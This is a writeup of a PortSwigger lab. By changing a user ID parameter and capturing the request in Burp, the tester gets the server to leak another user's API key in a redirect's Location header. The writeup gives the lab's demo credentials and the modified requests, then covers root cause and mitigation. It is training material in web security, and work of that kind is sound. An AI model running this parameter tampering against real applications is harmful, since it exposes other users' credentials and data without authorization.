# 🔐 PortSwigger Lab Writeup

## User ID Controlled by Request Parameter with Data Leakage in Redirect

---

## 📌 Overview

This lab demonstrates a **Horizontal Privilege Escalation vulnerability** combined with **sensitive data leakage via HTTP redirect**.

Although direct access to other users' accounts is restricted, the application unintentionally leaks sensitive information (API key) within the **redirect response**.

---

## 🧠 Vulnerability Details

* **Type:** Broken Access Control
* **Category:** IDOR + Information Disclosure
* **Impact:** Exposure of sensitive data via redirect

---

## ⚙️ Steps to Reproduce

### 1️⃣ Login as a normal user

```
Username: wiener  
Password: peter
```

---

### 2️⃣ Navigate to account page

```
/my-account?id=wiener
```

---

### 3️⃣ Intercept the request (Burp Suite)

Captured request:

```
GET /my-account?id=wiener HTTP/1.1
```

---

### 4️⃣ Modify user ID

Change the request to:

```
GET /my-account?id=carlos HTTP/1.1
```

---

### 5️⃣ Analyze server response (Important 🔥)

The server responds with a redirect:

```
HTTP/1.1 302 Found
Location: /login?apikey=XXXXXXXXXXXXXXXX
```

---

### 6️⃣ Extract sensitive data

* The **API key of Carlos** is leaked inside the `Location` header
* Copy the API key

---

### 7️⃣ Submit solution

* Submit the extracted API key → ✅ Lab solved

---

## 🚨 Root Cause

The application fails to properly handle unauthorized access attempts and **includes sensitive data in redirect responses**, even when access is denied.

---

## 💥 Impact

* Leakage of API keys
* Unauthorized access to user data
* Potential account compromise
* Exposure of sensitive information

---

## 🛡️ Mitigation

### ✅ Avoid sensitive data in redirects

* Never include API keys or tokens in URLs

---

### ✅ Enforce proper authorization

```php
if ($request->user()->id !== $requested_id) {
    abort(403);
}
```

---

### ✅ Use secure handling for errors

* Return generic error messages
* Do not expose internal data in redirects

---

## 🔥 Key Takeaways

* Redirect responses can leak sensitive data
* Browsers may hide vulnerabilities by automatically following redirects
* Always inspect raw HTTP responses using tools like Burp Suite
* Authentication ≠ Authorization

---

## 🧪 Tools Used

* Burp Suite
* Browser DevTools

---

## 🏁 Conclusion

This lab highlights how **improper handling of unauthorized access combined with unsafe redirect behavior can lead to critical data leakage**.

Security controls must ensure that sensitive information is never exposed, even in edge cases like redirects.

---
